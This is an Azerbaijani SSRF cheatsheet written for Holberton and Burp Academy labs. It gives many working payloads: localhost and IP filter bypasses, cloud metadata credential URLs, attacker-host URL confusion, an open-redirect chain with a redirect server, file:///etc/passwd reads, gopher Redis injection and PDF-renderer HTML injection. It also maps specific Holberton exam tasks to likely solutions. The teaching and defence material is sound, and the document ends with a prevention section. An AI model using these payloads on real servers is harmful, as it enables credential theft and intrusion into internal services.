# 🟠 SSRF (Server-Side Request Forgery) — Tam Cheatsheet

> Yalnız icazəli lab/imtahan mühitləri üçün (Holberton Cyber-WebSec 0x08, Burp Academy, öz lab-ın).

---

## 📑 Məzmun

0. [SSRF nədir, necə işləyir](#0-ssrf-nədir-necə-işləyir)
1. [SSRF Növləri](#1-ssrf-növləri)
2. [Təsiri & Risklər](#2-təsiri--risklər)
3. [Tipik SSRF Ssenariləri](#3-tipik-ssrf-ssenariləri)
4. [Discovery — Necə Tapmaq](#4-discovery--necə-tapmaq)
5. [Exploitation — Daxili Şəbəkə & Cloud Metadata](#5-exploitation--daxili-şəbəkə--cloud-metadata)
6. [Filter Bypass Texnikaları](#6-filter-bypass-texnikaları)
7. [Blind SSRF & Out-of-Band Detection](#7-blind-ssrf--out-of-band-detection)
8. [SSRF in PDF Generation](#8-ssrf-in-pdf-generation)
9. [Holberton Tapşırıqlarına Uyğun Strategiya](#9-holberton-tapşırıqlarına-uyğun-strategiya)
10. [Alətlər](#10-alətlər)
11. [Müdafiə / Prevention](#11-müdafiə--prevention)
12. [Quick Reference Payload Cədvəli](#12-quick-reference-payload-cədvəli)
13. [Faydalı Linklər](#13-faydalı-linklər)

---

## 0. SSRF nədir, necə işləyir

**Tərif:** SSRF — server-in özünün, **istifadəçi tərəfindən verilmiş URL/host/port** əsasında, **server-in adından** (server-in şəbəkə mövqeyindən, server-in IP-sindən, çox vaxt server-in icazələrindən) HTTP (və ya digər protokol) sorğusu göndərməsinə məcbur edilməsidir.

**Niyə bu qədər güclüdür?** Firewall/şəbəkə seqmentasiyası **xarici** trafiki bloklayır, amma server-in **özündən** çıxan sorğuları bloklamır — çünki server "trusted" (etibarlı) tərəf sayılır. Beləliklə attacker, fiziki olaraq daxili şəbəkəyə qoşulmadan, **server-i proksi kimi istifadə edib**, normalda internetdən əlçatmaz olan:
- daxili admin panellərə
- daxili API-lərə (mikroservis arxitekturasında)
- cloud metadata endpoint-lərinə
- localhost-da işləyən servislərə (Redis, Memcached, internal DB admin UI)

çata bilir.

```
İstifadəçi → [Server] → (server "mən" adından sorğu göndərir) → Daxili Şəbəkə/Cloud/Localhost
                ↑
        Attacker buranı manipulyasiya edir
```

**Sadə nümunə (bu layihədəki kimi):**

```
POST /check-reduction HTTP/1.1
...
articleApi=http://external-pricing-service.com/api/discount
```

Server bu URL-i çağırır və cavabı emal edir. Əgər `articleApi` validasiya olunmursa:

```
articleApi=http://127.0.0.1:3000/admin/dashboard
```

→ Server öz-özünə (localhost-a) sorğu göndərir → admin panel content-i server tərəfindən "fetch" olunur → nəticə bizə geri qaytarılır (Basic/Non-Blind SSRF) **və ya** sadəcə fonda baş verir (Blind SSRF).

---

## 1. SSRF Növləri

| Növ | İzahı |
|---|---|
| **Basic / Non-Blind SSRF** | Server-in fetch etdiyi resursun **cavabı birbaşa response-da görünür** (məs. JSON/HTML olaraq bizə qaytarılır). Ən rahat növ — nəticəni dərhal görürük. |
| **Blind SSRF** | Sorğu göndərilir, amma cavab bizə **göstərilmir**. Yalnız status-code fərqi, timing (vaxt) fərqi, və ya Out-of-Band (OOB) interaction ilə aşkar edilə bilər. |
| **Semi-Blind SSRF** | Cavab tam göstərilmir, amma **error message / HTTP status / response time** fərqi ilə "port açıqdır/bağlıdır" kimi məlumat sızır (port scanning üçün kifayətdir). |

---

## 2. Təsiri & Risklər

- **Daxili şəbəkənin tam enumerasiyası** (internal port scanning, internal IP range scanning)
- **Cloud metadata-dan credential oğurluğu** (AWS/Azure/GCP IAM rolu, API key-lər)
- **Daxili admin panel-lərə icazəsiz giriş** (məhz bu layihənin məqsədi)
- **Firewall/Network Segmentation-u bypass etmək** — server "trusted" zonadadır
- **Local File Read** (`file://` scheme dəstəkləndikdə) → konfiqurasiya faylları, credential-lar
- **RCE-yə qədər eskalasiya** (Gopher protokolu ilə Redis/Memcached-ə command inject etmək, və ya internal RCE endpoint-ə çatmaq)
- **DoS** (server-i öz-özünə sonsuz loop-a, ya da resurs-intensiv daxili servisə yönləndirmək)

---

## 3. Tipik SSRF Ssenariləri

| Funksionallıq | Niyə Risklidir |
|---|---|
| "Import from URL" / "Fetch remote resource" | Birbaşa URL parametri qəbul edir |
| Webhook konfiqurasiyası | Server callback URL-ə sorğu göndərir |
| Avatar/Image upload "from URL" | Şəkili server yükləyir → istənilən host-a sorğu |
| **URL Preview / Link unfurling** (Slack-style) | Metadata çəkmək üçün server URL-i fetch edir |
| **PDF/Invoice generation** (bu layihə) | HTML→PDF renderer daxili şəkillər/linklər/iframe-ləri "fetch" edir |
| XML Import (XXE → SSRF) | `<!ENTITY xxe SYSTEM "http://internal-host/">` |
| API gateway / mikroservis proxy-ləri | Bir servis digərinə "articleApi" kimi parametrlə müraciət edir |
| "Check price/discount from supplier API" (bu layihədəki `articleApi`) | Backend başqa "supplier" servisinə server adından sorğu göndərir |

---

## 4. Discovery — Necə Tapmaq

### 4.1 Şübhəli Parametr Adları

```
url, uri, path, dest, redirect, redirect_to, return, src, callback, window,
next, data, reference, site, html, val, validate, domain, callback_url,
return_url, page, feed, host, port, to, out, view, dir, show, navigate,
articleApi, api, endpoint, target, file, document, image, avatar, webhook
```

> Bu layihədə açar söz: **`articleApi`** — adından göründüyü kimi, backend bu parametrdə verilən URL-ə (guya "supplier/article API"-yə) sorğu göndərir.

### 4.2 Burp Suite ilə Axtarış

1. **Proxy → HTTP History** — bütün sorğulara bax, yuxarıdakı parametr adlarını axtar.
2. Maraqlı bir endpoint tapdıqda (məs. "check reduction") → **Send to Repeater**.
3. Parametr dəyərini öz domain-inə (və ya Burp Collaborator-a) dəyiş, sorğu gəlirmi yoxla.
4. **Burp Collaborator client**-i aç (`Burp → Collaborator`) → unikal subdomain generasiya et → payload-a yerləşdir → "Poll now" ilə DNS/HTTP interaction-ları yoxla (Blind SSRF aşkarlanması üçün).

### 4.3 Manual Test (ilk addım — həmişə bunu sına)

```
articleApi=http://your-burp-collaborator-id.oastify.com/
```

Əgər Collaborator-da interaction qeydə alınırsa → **SSRF təsdiqlənib** (heç olmasa blind formada).

---

## 5. Exploitation — Daxili Şəbəkə & Cloud Metadata

### 5.1 Daxili Admin Panel-ə Çatmaq

```
articleApi=http://127.0.0.1:3000/admin
articleApi=http://localhost:3000/admin/dashboard
articleApi=http://internal-admin.local:8080/
```

### 5.2 Daxili Port Scanning (Semi-Blind SSRF ilə)

Müxtəlif portları sına, response time/status code fərqinə diqqət et:

```
articleApi=http://127.0.0.1:22/      → Connection refused / fərqli error (bağlı)
articleApi=http://127.0.0.1:3306/    → MySQL — fərqli error formatı (açıq, başqa protokol)
articleApi=http://127.0.0.1:6379/    → Redis
articleApi=http://127.0.0.1:8080/    → HTTP servis cavab verir (açıq!)
articleApi=http://127.0.0.1:9200/    → Elasticsearch
articleApi=http://127.0.0.1:27017/   → MongoDB
```

> Burp Intruder ilə port nömrəsini `§1-65535§` kimi dəyişən sahə et, response length/status/time fərqlərinə görə açıq portları tap.

### 5.3 Cloud Metadata Endpoint-ləri (klassik SSRF "yağlı tikə"-si)

```bash
# AWS (IMDSv1 — token tələb etmir, ən asan)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>

# AWS IMDSv2 (token tələb edir — adi GET SSRF ilə BYPASS OLUNMUR, çünki PUT + header lazımdır)
# Yalnız server SSRF zamanı HTTP metodunu/header-ləri sərbəst seçməyə icazə verirsə mümkündür

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header lazımdır: Metadata:true   (GET-only SSRF-də header əlavə etmək mümkün olmaya bilər)

# GCP
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header lazımdır: Metadata-Flavor: Google

# DigitalOcean
http://169.254.169.254/metadata/v1.json

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
```

> 🧠 Qeyd: Bəzi metadata endpoint-ləri header tələb edir (Azure, GCP). Əgər SSRF nöqtəsi yalnız URL-i sənin yazdığın kimi GET edirsə (header əlavə edə bilmirsən), AWS IMDSv1 ən asan hədəfdir, çünki heç bir header tələb olunmur.

---

## 6. Filter Bypass Texnikaları

> 🧠 **Bu, bu cheatsheet-in ən vacib bölməsidir** — Holberton-un tapşırıq 1, 2, 3 məhz buna həsr olunub (mitigation-ları bypass etmək).

### 6.1 IP Obfuscation — "localhost"/"127.0.0.1" String-Blacklist Bypass

Filter çox vaxt sadəcə **string olaraq** `"localhost"` və ya `"127.0.0.1"` axtarır. Eyni IP-ni başqa formatda yazmaqla bunu asanlıqla keçmək olar:

| Format | Nümunə (127.0.0.1 üçün) | İzah |
|---|---|---|
| **Decimal** | `http://2130706433/` | `127*256³ + 0*256² + 0*256 + 1 = 2130706433` |
| **Octal** | `http://0177.0.0.1/` və ya `http://017700000001/` | Hər oktet 0 ilə başlayanda octal kimi parse oluna bilər |
| **Hexadecimal** | `http://0x7f000001/` və ya `http://0x7f.0x0.0x0.0x1/` | Hex format |
| **Short/Dropped octets** | `http://127.1/` | Bəzi OS-larda `127.1` = `127.0.0.1` |
| **Zero-padded** | `http://127.000.000.1/` | Sadə görünməyən, amma eyni IP |
| **IPv6 loopback** | `http://[::1]/` | IPv6-da localhost |
| **IPv6-mapped IPv4** | `http://[::ffff:127.0.0.1]/` | Bəzi parserlər bunu tanımır |
| **Case dəyişikliyi** | `http://LOCALHOST/` , `http://LocalHost/` | Filter case-sensitive olarsa işləyir |

> 🎯 **Holberton Task 1 dəqiq bunu istəyir:** "Bypass the filter by providing decimal representation of the localhost." → `articleApi=http://2130706433:3001/admin` (port-u öz tapşırığına uyğun dəyiş).

**Decimal IP-ni özün hesablamaq üçün (hər hansı internal IP üçün, təkcə 127.0.0.1 deyil):**

```bash
python3 -c "import socket, struct; print(struct.unpack('!I', socket.inet_aton('127.0.0.1'))[0])"
# çıxış: 2130706433

# Linux/macOS-da tez yoxlama (decimal IP-yə ping):
ping 2130706433
```

### 6.2 DNS-Based Bypass — Domain Adı String Match-i Aldadır

Əgər filter "URL-də 127.0.0.1 və ya localhost YAZILMASIN" qaydasına əsaslanırsa (string-based), amma DNS-resolve edilmiş IP-ni yoxlamırsa:

```
http://localtest.me/          → həqiqi domain, DNS-də 127.0.0.1-ə point edir
http://customer.app.localhost.my.company.127.0.0.1.nip.io/   → nip.io subdomain-də istənilən IP-ni encode edir
http://10.0.0.5.nip.io/        → 10.0.0.5-ə resolve olur (internal IP range üçün ƏLA)
http://127-0-0-1.sslip.io/     → eyni konsepsiya, fərqli provider
```

> 🧠 `nip.io`/`sslip.io` — subdomain-in özündə istənilən IP-ni "encode" edib, DNS A record olaraq həmin IP-ni qaytarır. Bu, **HƏR İSTƏNİLƏN daxili IP** üçün işləyir (yalnız localhost deyil) — internal şəbəkə range-ini pivot etmək üçün çox güclüdür.

**Öz domain-ini DNS ilə daxili IP-yə yönəltmək (whitelist bypass üçün ən güclü üsul):**

Əgər filter whitelist əsaslıdır (yalnız `*.trusted-domain.com` icazəlidir), amma "trusted-domain.com" hostname-i string olaraq yoxlanır, DNS resolve edilmiş IP yoxlanmırsa → öz subdomain-ini həqiqi internal IP-yə A record kimi göstər (DNS Rebinding-in sadə forması).

### 6.3 URL Parser Confusion — `@` Trick

HTTP URL formatı: `scheme://userinfo@host:port/path`. Bəzi sadə (regex-based) validator-lar `@`-dan ƏVVƏLKİ hissəni "host" kimi qəbul edir, AMMA həqiqi HTTP client (browser/curl/server-in fetch kitabxanası) `@`-dan SONRAKI hissəyə qoşulur:

```
http://trusted-domain.com@127.0.0.1/admin
http://trusted-domain.com@127.0.0.1:8080/
http://trusted-domain.com%40127.0.0.1/admin    (URL-encoded @ — double bypass)
```

**Fragment/path confusion (whitelist `startsWith`/`contains` istifadə edirsə):**

```
http://127.0.0.1/trusted-domain.com
http://trusted-domain.com.attacker.com/        (subdomain confusion — "contains trusted-domain.com" doğrudur, amma əsl host attacker.com-dur)
http://attacker.com#trusted-domain.com/        (fragment — server-ə görə host attacker.com)
http://attacker.com?trusted-domain.com/        (query string-də "trusted-domain.com" var, host isə attacker.com)
```

### 6.4 Open Redirect Bypass — Whitelist-i "Daxildən" Keçmək

> 🎯 **Holberton Task 3 dəqiq bunu istəyir** ("New Feature To Navigate Product... Trying Exploiting The Redirection"): Whitelist yalnız ilk sorğunun host-unu yoxlayır, AMMA server-in fetch kitabxanası **HTTP 3xx redirect-i avtomatik izləyir**. Əgər app-in özündə (whitelist-də olan domain daxilində) bir "redirect/navigate" endpoint-i varsa, onu özünə qarşı silah kimi istifadə et:

```
# Addım 1: app-in öz domenində olan redirect endpoint-ini tap
# Məs: http://web0x08.hbtn/app4-1/redirect?url=...  və ya  /navigate?to=...

# Addım 2: SSRF parametrinə BU redirect endpoint-ini ver (whitelist-i keçir, çünki domain "trusted"-dir)
articleApi=http://web0x08.hbtn/app4-1/redirect?url=http://127.0.0.1:8080/admin

# Server: 1) whitelist yoxlayır → "web0x08.hbtn" ✅ icazəli
#         2) sorğu göndərir → server 302 Location: http://127.0.0.1:8080/admin qaytarır
#         3) HTTP client (server-in özü) redirect-i AVTOMATİK izləyir
#         4) Nəticədə daxili admin panelə sorğu göndərilir — whitelist tam bypass olundu!
```

**Əgər sənin öz redirect endpoint-in yoxdursa, öz serverini istifadə et:**

```bash
# Öz VPS/Burp Collaborator-da sadə redirect server qur
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://127.0.0.1:8080/admin')
        self.end_headers()
HTTPServer(('0.0.0.0', 8000), H).serve_forever()
"
# Sonra: articleApi=http://<sənin_IP>:8000/
```

> 🧠 **Niyə HTTP client-lər redirect-i izləyir:** `requests`, `axios`, `node-fetch`, `curl -L` kimi kitabxanalar default olaraq `follow_redirects=True`-dir. Validasiya yalnız İLK URL-ə tətbiq olunur, redirect-dən SONRAKI URL-ə YOX — bu, SSRF mitigation-larında ən tez-rast gəlinən səhvdir.

### 6.5 Protocol/Scheme Hiyləsi

```
file:///etc/passwd                    # Local File Read (scheme bloklanmayıbsa)
gopher://127.0.0.1:6379/_<payload>    # Redis-ə raw command inject (Gopherus ilə generasiya et)
dict://127.0.0.1:6379/info            # Dict protokolu ilə port scan
ftp://internal-server/                # FTP servislərinə müraciət
```

### 6.6 Whitespace/Encoding Trick-ləri

```
http://127.0.0.1%2F%2F@trusted.com/         # URL encoding ilə parser-i çaşdırmaq
http://0x7f.0.0.1/                          # hex + dot notasiya qarışığı
http://①②⑦.0.0.1/                          # unicode rəqəm homoglyph (nadir, amma mümkün)
```

---

## 7. Blind SSRF & Out-of-Band Detection

Əgər cavab göstərilmirsə:

```bash
# 1. Burp Collaborator / interactsh-client başlat
interactsh-client
# → unikal domain alırsan: abc123.oast.fun

# 2. Payload-a yerləşdir
articleApi=http://abc123.oast.fun/test

# 3. DNS/HTTP interaction gəlirmi yoxla
# Gəlirsə → server faktiki sorğu göndərib = SSRF təsdiqlənib (hətta cavab görünməsə də)
```

**Timing-based blind SSRF testi (alət yoxdursa):**

```bash
# Açıq port (sürətli cavab) vs bağlı port (timeout, uzun gözləmə) fərqini ölç
time curl -X POST app.com/check -d "articleApi=http://127.0.0.1:9999/"   # filtered/closed → timeout
time curl -X POST app.com/check -d "articleApi=http://127.0.0.1:8080/"   # open → tez cavab
```

---

## 8. SSRF in PDF Generation

> 🎯 **Holberton Task 4 məhz bu kateqoriyadır.** PDF generation çox vaxt **headless browser** (Puppeteer/Chromium) və ya **wkhtmltopdf** (WebKit əsaslı) ilə işləyir — yəni HTML-i PDF-ə "render" edən mini-browser-dir. Bu browser HTML daxilindəki HƏR resursu (şəkil, iframe, CSS, font) **server tərəfindən fetch edir** → bu, klassik SSRF imkanı yaradır.

### 8.1 İlk Yoxlama — Input Haradan Gəlir?

- İnvoys/order-da **"qeyd" (note), ünvan, məhsul adı** kimi sahələr HTML-ə birbaşa daxil edilirmi (HTML injection mümkün olub PDF-ə düşürmü)?
- Yoxsa siz birbaşa bir **URL** verirsiniz (məs. "invoice preview URL") və bu URL-in TAM SƏHİFƵSİ PDF-ə çevrilir?

### 8.2 Ssenari A: Siz birbaşa URL verirsiniz

```
invoiceUrl=http://127.0.0.1:8080/admin
```

Render olunan PDF-i endirib aç → admin panelin **screenshot/HTML render-i** PDF daxilində görünür. Bu, ən təmiz SSRF + data exfiltration formasıdır (Basic SSRF kimi davranır, sadəcə nəticə PDF formatındadır).

### 8.3 Ssenari B: HTML İnjection → SSRF (invoice qeyd sahəsi və s.)

Əgər bir mətn sahəsi (sifariş qeydi, ünvan, məhsul başlığı) PDF HTML-inə sanitizasiya olmadan əlavə olunursa, bu sahəyə HTML payload yerləşdir:

```html
<!-- Daxili admin panelin tam render-ini PDF-ə "yapışdırmaq" -->
<iframe src="http://127.0.0.1:8080/admin" width="1000" height="800"></iframe>

<!-- Local File Read (wkhtmltopdf köhnə versiyalarda file:// dəstəkləyir) -->
<img src="file:///etc/passwd">
<iframe src="file:///etc/passwd"></iframe>

<!-- wkhtmltopdf-a məxsus: local faylı PDF-ə "attachment" kimi əlavə etmək -->
<link rel="attachment" href="file:///etc/passwd">

<!-- SSRF "yoxlama" üçün ən sadə pixel -->
<img src="http://你的-collaborator-id.oastify.com/test.png">

<!-- CSS üzərindən SSRF -->
<link rel="stylesheet" href="http://127.0.0.1:8080/admin/style.css">
```

> 🧠 **wkhtmltopdf** tarixən **çoxlu CVE**-yə malikdir (local file read, SSRF) — Webkit mühərriki köhnəlmiş və "sandbox"sızdır. Versiyanı müəyyən etmək üçün PDF metadata-sına (`Producer` field) bax: `exiftool generated.pdf` və ya PDF-i mətn redaktorunda aç, "Producer" sətrinə nəzər sal.

### 8.4 Local File Read Nəticəsini Çıxarmaq

```bash
# Generasiya olunan PDF-i endir, mətnini çıxar
pdftotext invoice.pdf - 
# /etc/passwd məzmunu PDF mətn layer-ində görünməlidir (file:// işləyibsə)
```

### 8.5 Server-Side Screenshot/Render via Headless Chrome (Puppeteer əsaslı sistemlər)

```
# Əgər invoice URL-i Puppeteer ilə render olunursa, JS icra da mümkün ola bilər
<script>fetch('http://127.0.0.1:8080/admin').then(r=>r.text()).then(t=>document.write(t))</script>
```

(Bu, render zamanı browser-in JS icra etməsindən asılıdır — `--disable-javascript` aktiv deyilsə işləyə bilər.)

---

## 9. Holberton Tapşırıqlarına Uyğun Strategiya

> ⚠️ Bunlar tapşırıq təsvirlərindəki **hint-lərə əsasən ən ehtimal olunan texnika kateqoriyalarıdır** — real app-də Burp ilə yoxlayıb dəqiqləşdir, çünki konkret həll detalları faylda yoxdur.

| Task | Port | Müdafiə Səviyyəsi | Cəhd Et |
|---|---|---|---|
| **0** | 3000 | Müdafiə yox (vanilla SSRF) | `articleApi=http://127.0.0.1:3000/admin` birbaşa — §5.1 |
| **1** | 3001 | `localhost`/`127.0.0.1` string blacklist | **Decimal IP**: `articleApi=http://2130706433:3001/admin` — §6.1 (tapşırıqda birbaşa deyilib) |
| **2** | 3002 | Daha güclü blacklist (decimal də bloklana bilər) | Octal/Hex/IPv6 (`[::1]`), case dəyişikliyi, ya da nip.io DNS bypass — §6.1, §6.2 sırayla sına |
| **3** | 8080 | Whitelist + "Navigate Product" redirect funksiyası | **Open Redirect chain** — app-in öz redirect/navigate endpoint-ini whitelisted URL kimi ver, o da daxili `127.0.0.1:8080`-ə yönləndirsin — §6.4 |
| **4** | — (app5) | PDF generation | İnvoice/qeyd sahəsində HTML injection və ya birbaşa URL parametri ilə daxili admin/`file://` çağır — §8 |

**Hər tapşırıq üçün metodoloji ardıcıllıq:**

```
1. Burp-da "check reduction" sorğusunu Repeater-ə göndər
2. articleApi parametrini dəyişərək özünə (Collaborator) sorğu göndər → SSRF təsdiqlə
3. localhost/127.0.0.1 → əgər bloklanırsa, error mesajına diqqət et (filter logikasını anla)
4. §6-dakı bypass-ları sırayla sına (ən sadədən mürəkkəbə)
5. Daxili admin panel-ə çatdıqdan sonra, response-da admin content-i axtar
```

---

## 10. Alətlər

| Alət | Məqsəd |
|---|---|
| **Burp Suite** (Repeater, Intruder, Collaborator) | Manual test + blind SSRF aşkarlama |
| **interactsh-client** | OOB (out-of-band) interaction toplama (Collaborator alternativi, open-source) |
| **SSRFmap** (`github.com/swisskyrepo/SSRFmap`) | SSRF-i avtomatik exploit etmək (port scan, cloud metadata, gopher) |
| **Gopherus** (`github.com/tarunkant/Gopherus`) | Redis/MySQL/SMTP üçün gopher:// payload generasiyası |
| **recollapse** | Regex-based filter bypass payload-ları avtomatik generasiya edir |
| **ffuf / Burp Intruder** | Port scanning (response time/length fərqi ilə) |

```bash
# SSRFmap nümunəsi
python3 ssrfmap.py -r request.txt -p articleApi -m readfiles
python3 ssrfmap.py -r request.txt -p articleApi -m portscan
```

---

## 11. Müdafiə / Prevention

> Exam-da nəzəri sual gələ bilər ("How to protect against SSRF") — buna görə bu bölmə vacibdir.

1. **Allowlist, blacklist yox** — yalnız konkret, əvvəlcədən bilinən domain/IP-lərə icazə ver (string-match yox, **tam URL parsing** ilə).
2. **DNS resolution-dan SONRA IP-ni yoxla** — hostname-i deyil, faktiki resolve olunan IP-ni blacklist/allowlist-lə müqayisə et (DNS rebinding-in qarşısını alır).
3. **Redirect-ləri izləməmə** ya da hər redirect addımında YENİDƏN validasiya (open-redirect chain bypass-ının qarşısını alır).
4. **Yalnız lazımi URL scheme-lərə icazə** (`http`/`https` yalnız) — `file://`, `gopher://`, `dict://`, `ftp://` blokla.
5. **Network-level seqmentasiya** — tətbiq serverindən daxili kritik servislərə (metadata endpoint, admin panel) firewall qaydası ilə giriş.
6. **Cloud-da IMDSv2 məcburi et** (AWS) — token-based metadata access, sadə GET SSRF ilə oxunmur.
7. **Response-u user-ə qaytarmamaq** (mümkünsə) — Non-Blind SSRF-i Blind-ə çevirmək, təsiri azaldır (tam həll deyil).
8. **PDF/HTML render mühərriklərini sandbox-la** — `--disable-local-file-access`, JS-i deaktiv et, network access-i whitelist-lə məhdudlaşdır.
9. **Output validation + Content-Type yoxlanması** — gözlənilən cavab formatından (məs. yalnız JSON) kənar cavabları rədd et.

---

## 12. Quick Reference Payload Cədvəli

```
# Basic
http://127.0.0.1/admin
http://localhost/admin
http://[::1]/admin

# Decimal
http://2130706433/admin

# Octal
http://0177.0.0.1/admin

# Hex
http://0x7f000001/admin
http://0x7f.0x0.0x0.0x1/admin

# Short form
http://127.1/admin

# DNS-based (istənilən IP üçün universal)
http://10.0.0.5.nip.io/admin
http://localtest.me/admin

# @ trick
http://trusted.com@127.0.0.1/admin
http://trusted.com%40127.0.0.1/admin

# Open redirect chain
http://trusted.com/redirect?url=http://127.0.0.1:8080/admin

# Cloud metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# File read
file:///etc/passwd

# Gopher (Redis RCE üçün — Gopherus ilə generasiya et)
gopher://127.0.0.1:6379/_*payload*

# Collaborator/OOB test
http://<your-id>.oastify.com/
```

---

## 13. Faydalı Linklər

- **PortSwigger — SSRF (ən yaxşı nəzəri+praktik mənbə):** https://portswigger.net/web-security/ssrf
- **PortSwigger SSRF Labs:** https://portswigger.net/web-security/ssrf
- **OWASP — SSRF Prevention Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- **HackTricks — SSRF:** https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- **SSRFmap (GitHub):** https://github.com/swisskyrepo/SSRFmap
- **Gopherus (GitHub):** https://github.com/tarunkant/Gopherus
- **nip.io:** https://nip.io/
- **interactsh (GitHub):** https://github.com/projectdiscovery/interactsh
- **wkhtmltopdf SSRF/LFI bilinən problemlər:** https://github.com/wkhtmltopdf/wkhtmltopdf/issues
- **Orange Tsai — "A New Era of SSRF" (gopher/protocol smuggling klassiyi):** https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf

---
